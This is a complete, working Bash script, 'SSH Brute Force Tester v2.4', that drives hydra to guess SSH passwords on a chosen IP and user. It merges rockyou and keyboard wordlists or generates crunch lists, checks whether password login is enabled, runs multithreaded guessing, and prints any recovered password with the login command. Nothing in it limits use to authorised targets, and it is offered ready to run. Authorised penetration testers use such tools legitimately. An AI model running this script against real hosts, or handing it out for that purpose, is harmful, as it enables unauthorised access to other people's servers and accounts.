#!/bin/bash
# SSH Brute Force Tester v2.4
# Usage: ./ssh-brute.sh <ip> <user> [wordlist] [port]

IP="${1:?Usage: $0 ip user wordlist port}"
USER="${2:?Usage: $0 ip user wordlist port}"
WORDLIST_ARG="${3:-all}"
PORT="${4:-22}"
LOG="${TMPDIR:-/tmp}/ssh-brute-$(date +%Y%m%d-%H%M%S).log"
TIMEOUT=300

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log() { echo -e "$1" | tee -a "$LOG"; }
strip_ansi() { echo "$1" | sed 's/\x1b\[[0-9;]*m//g'; }

log "${YELLOW}=== SSH Brute Force Tester v2.4 ===${NC}"
log "Target: ${RED}${IP}:${PORT}${NC}"
log "User:   ${RED}${USER}${NC}"
log "Log:    ${LOG}"
log ""

# === Pre-checks ===
if ! command -v hydra &>/dev/null; then
    log "${RED}[!] hydra not installed${NC}"
    log "${RED}    Ubuntu: sudo apt install hydra -y${NC}"
    log "${RED}    Termux: pkg install hydra -y${NC}"
    exit 1
fi

if ! command -v ssh &>/dev/null; then
    log "${RED}[!] ssh not installed${NC}"
    exit 1
fi

# === Wordlist selection ===
SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "$0" 2>/dev/null || echo "$0")")" && pwd)"
WL_COMMON="${SCRIPT_DIR}/wordlist.txt"
WL_KEYBOARD="${SCRIPT_DIR}/wordlist-keyboard.txt"
WL_ROCKYOU="${SCRIPT_DIR}/wordlist-rockyou-10k.txt"
WL_MERGED="${TMPDIR:-/tmp}/ssh-brute-merged.txt"

generate_crunch() {
    local type="$1"
    local outfile="${TMPDIR:-/tmp}/ssh-brute-crunch-${type}.txt"
    if [ -f "$outfile" ] && [ -s "$outfile" ]; then
        echo "$outfile"
        return
    fi
    log "${YELLOW}[*] Generating crunch wordlist: ${type}${NC}"
    if ! command -v crunch &>/dev/null; then
        log "${RED}[!] crunch not installed${NC}"
        log "${RED}    Ubuntu: sudo apt install crunch -y${NC}"
        log "${RED}    Termux: pkg install crunch -y${NC}"
        exit 1
    fi
    case "$type" in
        6lower) crunch 6 6 abcdefghijklmnopqrstuvwxyz -o "$outfile" 2>/dev/null ;;
        6alnum) crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 -o "$outfile" 2>/dev/null ;;
        6digit) crunch 6 6 0123456789 -o "$outfile" 2>/dev/null ;;
        8digit) crunch 8 8 0123456789 -o "$outfile" 2>/dev/null ;;
        *) log "${RED}[!] Unknown crunch type: ${type}${NC}"; exit 1 ;;
    esac
    echo "$outfile"
}

case "$WORDLIST_ARG" in
    all)
        cat "$WL_COMMON" "$WL_KEYBOARD" "$WL_ROCKYOU" > "$WL_MERGED" 2>/dev/null || true
        sort -u "$WL_MERGED" -o "$WL_MERGED"
        WORDLIST="$WL_MERGED"
        log "${GREEN}[*] Using all built-in wordlists${NC}"
        ;;
    rockyou)
        WORDLIST="$WL_ROCKYOU"
        log "${GREEN}[*] Using rockyou-10k wordlist${NC}"
        ;;
    "crunch 6lower")
        WORDLIST=$(generate_crunch "6lower")
        ;;
    "crunch 6alnum")
        WORDLIST=$(generate_crunch "6alnum")
        ;;
    "crunch 6digit")
        WORDLIST=$(generate_crunch "6digit")
        ;;
    "crunch 8digit")
        WORDLIST=$(generate_crunch "8digit")
        ;;
    *)
        WORDLIST="$WORDLIST_ARG"
        ;;
esac

if [ ! -f "$WORDLIST" ]; then
    log "${RED}[!] Wordlist not found: ${WORDLIST}${NC}"
    exit 1
fi
if [ ! -s "$WORDLIST" ]; then
    log "${RED}[!] Wordlist is empty: ${WORDLIST}${NC}"
    exit 1
fi

# === Check password auth ===
log "${YELLOW}[1/3] Checking password auth on port ${PORT}...${NC}"
SSH_OUTPUT=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
    -o PreferredAuthentications=none -p "$PORT" "$USER@$IP" 2>&1) || true

if [[ "$SSH_OUTPUT" == *"publickey"* ]]; then
    log "${RED}[!] Target only accepts SSH keys - brute force impossible${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"Connection refused"* ]]; then
    log "${RED}[!] Connection refused on port ${PORT}${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"Connection timed out"* ]]; then
    log "${RED}[!] Connection timed out on port ${PORT}${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"No route to host"* ]]; then
    log "${RED}[!] No route to host${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"Network is unreachable"* ]]; then
    log "${RED}[!] Network unreachable${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"Permission denied"* ]]; then
    log "${GREEN}[+] Password auth supported!${NC}"
else
    log "${YELLOW}[?] Unknown response, trying anyway...${NC}"
    log "${YELLOW}[?] SSH: ${SSH_OUTPUT}${NC}"
fi

# === Attack ===
COUNT=$(wc -l < "$WORDLIST" | tr -d ' ')
if [ "$COUNT" -eq 0 ]; then
    log "${RED}[!] Wordlist is empty after reading${NC}"
    exit 1
fi

# Estimate time
EST_SEC=$((COUNT / 4))
EST_MIN=$((EST_SEC / 60))

log "${YELLOW}[2/3] Wordlist: ${COUNT} passwords${NC}"
if [ $EST_MIN -gt 60 ]; then
    EST_HR=$((EST_MIN / 60))
    log "${YELLOW}       Estimated time: ~${EST_HR}h${NC}"
elif [ $EST_MIN -gt 0 ]; then
    log "${YELLOW}       Estimated time: ~${EST_MIN}min${NC}"
else
    log "${YELLOW}       Estimated time: ~${EST_SEC}sec${NC}"
fi
log "${YELLOW}[3/3] Starting brute force...${NC}"
log ""

# Auto-detect thread count
if [ -d "/data/data/com.termux" ]; then
    THREADS=2
else
    THREADS=4
fi

FOUND_LINE=""
HYDRA_EXIT=0

while IFS= read -r line; do
    if [[ "$line" == *"host:"* ]]; then
        FOUND_LINE="$line"
        log ""
        log "${GREEN}========================================${NC}"
        log "${GREEN}  PASSWORD FOUND!                        ${NC}"
        log "${GREEN}========================================${NC}"
        log "${GREEN}[FOUND] ${line}${NC}"
        log "${GREEN}[CMD]   ssh -p ${PORT} ${USER}@${IP}${NC}"
        strip_ansi "$line" >> "${LOG}.clean"
    elif [[ "$line" == *"[ATTEMPT]"* ]]; then
        attempt=$(echo "$line" | sed -n 's/.*login: //p')
        printf "${CYAN}[*] Trying: %s\033[K\r${NC}" "$attempt"
    elif [[ "$line" == *"ERROR"* ]]; then
        log "${RED}[ERR] ${line}${NC}"
    fi
    strip_ansi "$line" >> "${LOG}.raw"
done < <(timeout "$TIMEOUT" hydra -l "$USER" -P "$WORDLIST" -t "$THREADS" -f -V -s "$PORT" "$IP" ssh 2>&1) || HYDRA_EXIT=$?

log ""
log ""

# === Results ===
if [ $HYDRA_EXIT -eq 124 ]; then
    log "${RED}[!] Timed out after ${TIMEOUT} seconds${NC}"
    log "${RED}    Only partial wordlist tried. Increase timeout:${NC}"
    log "${RED}    TIMEOUT=600 ./ssh-brute.sh ${IP} ${USER} all ${PORT}${NC}"
elif [ -n "$FOUND_LINE" ]; then
    log "${GREEN}[+] SSH: ssh -p ${PORT} ${USER}@${IP}${NC}"
elif [ $HYDRA_EXIT -eq 0 ] || [ $HYDRA_EXIT -eq 1 ]; then
    log "${YELLOW}[-] No password found - ${COUNT} tried${NC}"
    log "${YELLOW}[-] Try bigger wordlist:${NC}"
    log "${YELLOW}    ./ssh-brute.sh ${IP} ${USER} rockyou ${PORT}${NC}"
    log "${YELLOW}    ./ssh-brute.sh ${IP} ${USER} 'crunch 6digit' ${PORT}${NC}"
    log "${YELLOW}    ./ssh-brute.sh ${IP} ${USER} 'crunch 6lower' ${PORT}${NC}"
    log "${YELLOW}    ./ssh-brute.sh ${IP} ${USER} 'crunch 6alnum' ${PORT}${NC}"
    log "${YELLOW}    ./ssh-brute.sh ${IP} ${USER} 'crunch 8digit' ${PORT}${NC}"
    log "${YELLOW}    pkg install wordlists${NC}"
    log "${YELLOW}    ./ssh-brute.sh ${IP} ${USER} /usr/share/wordlists/rockyou.txt ${PORT}${NC}"
else
    log "${RED}[!] Hydra exited with code ${HYDRA_EXIT}${NC}"
fi

log "${YELLOW}=== Scan Complete ===${NC}"
log "Log: ${LOG}"
[ -f "${LOG}.clean" ] && log "Clean: ${LOG}.clean"
[ -f "${LOG}.raw" ] && log "Raw: ${LOG}.raw"
